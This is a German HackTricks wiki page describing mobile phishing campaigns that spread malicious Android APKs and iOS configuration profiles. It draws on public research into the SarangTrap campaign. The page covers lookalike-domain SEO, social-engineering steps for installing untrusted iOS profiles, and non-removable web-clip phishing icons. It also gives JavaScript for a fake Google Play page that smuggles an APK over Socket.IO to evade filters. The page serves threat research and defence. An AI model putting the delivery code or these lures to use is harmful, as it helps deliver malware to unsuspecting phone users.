# Mobile Phishing & Verteilung schädlicher Apps (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Diese Seite behandelt Techniken, mit denen Threat Actors **schädliche Android-APKs** und **iOS-Mobile-Konfigurationsprofile** über Phishing verbreiten (SEO, Social Engineering, gefälschte Stores, Dating-Apps usw.).
> Das Material basiert auf der SarangTrap-Kampagne, die 2025 von Zimperium zLabs aufgedeckt wurde, sowie weiteren öffentlichen Untersuchungen.<sup>[[1]](#references)</sup>

## Angriffsablauf

1. **SEO-/Phishing-Infrastruktur**
   * Dutzende ähnlich aussehende Domains registrieren (Dating, Cloud-Freigabe, Autodienst usw.).  
     – Lokale Keywords und Emojis im `<title>`-Element verwenden, um das Ranking bei Google zu verbessern.  
     – Android-Installationsanleitungen (`.apk`) und iOS-Installationsanleitungen auf derselben Landingpage hosten.
2. **Download der ersten Stufe**
   * Android: direkter Link zu einer *unsignierten* APK oder einer APK aus einem „Drittanbieter-Store“.  
   * iOS: `itms-services://`- oder einfacher HTTPS-Link zu einem schädlichen **mobileconfig**-Profil (siehe unten).
3. **Verhalten von Android nach der Installation**
   * C2-gesteuerte Ausführung, Missbrauch von Berechtigungen, Umgehung von Droppern, Datensammlung im Hintergrund und weiteres Malware-Verhalten nach der Installation werden auf der speziellen Seite zu Android-Malware-Post-Exploitation weiter unten behandelt.
4. **iOS-Zustellungstechnik**
   * Ein einzelnes **Mobile-Konfigurationsprofil** kann `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` usw. anfordern, um das Gerät in eine einer „MDM“-Verwaltung ähnliche Überwachung einzubinden.  
   * Anweisungen für Social Engineering:
     1. Einstellungen öffnen ➜ *Profil geladen*.
     2. Dreimal auf *Installieren* tippen (Screenshots auf der Phishing-Seite).  
     3. Dem unsignierten Profil vertrauen ➜ Der Angreifer erhält Berechtigungen für *Kontakte* und *Fotos*, ohne eine App-Store-Prüfung.
5. **iOS-Web-Clip-Payload (Phishing-App-Symbol)**
   * `com.apple.webClip.managed`-Payloads können **eine Phishing-URL mit einem markengebundenen Symbol und Label auf dem Home-Bildschirm anheften**.
   * Web Clips können **im Vollbildmodus** ausgeführt werden (blendet die Browser-Oberfläche aus) und als **nicht entfernbar** markiert sein, sodass das Opfer das Profil löschen muss, um das Symbol zu entfernen.<sup>[[3]](#references)</sup>
6. **Netzwerkschicht**
   * Unverschlüsseltes HTTP, häufig über Port 80 mit einem HOST-Header wie `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (kein TLS → leicht zu erkennen).

## Android-Malware-Post-Exploitation

Informationen zu Android-Malware-Techniken nach der Installation, etwa C2, Missbrauch von Accessibility, Overlays, ATS-Automatisierung, gestaffeltes DEX-Laden, Premium-SMS und Persistenz, finden Sie hier:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK Smuggling über Socket.IO/WebSocket + gefälschte Google-Play-Seiten

Angreifer ersetzen statische APK-Links zunehmend durch einen in Google-Play-ähnliche Köder eingebetteten Socket.IO/WebSocket-Kanal. Dadurch wird die Payload-URL verborgen, werden URL- und Erweiterungsfilter umgangen und bleibt die Installationsoberfläche realistisch.<sup>[[2]](#references)[[4]](#references)</sup>

Typischer, in freier Wildbahn beobachteter Client-Ablauf:

<details>
<summary>Gefälschter Play-Downloader mit Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Warum es einfache Kontrollen umgeht:
- Es wird keine statische APK-URL offengelegt; die Payload wird im Speicher aus WebSocket-Frames rekonstruiert.
- URL-/MIME-/Dateiendungsfilter, die direkte .apk-Antworten blockieren, übersehen möglicherweise Binärdaten, die über WebSockets/Socket.IO getunnelt werden.
- Crawler und URL-Sandboxes, die keine WebSockets ausführen, rufen die Payload nicht ab.

Siehe auch WebSocket-Tradecraft und -Tools:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Die dunkle Seite der Romantik: SarangTrap-Erpressungskampagne](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Web Clips-Payload-Einstellungen für Apple-Geräte](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker-Trojaner zielt auf indonesische und vietnamesische Android-Nutzer ab](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
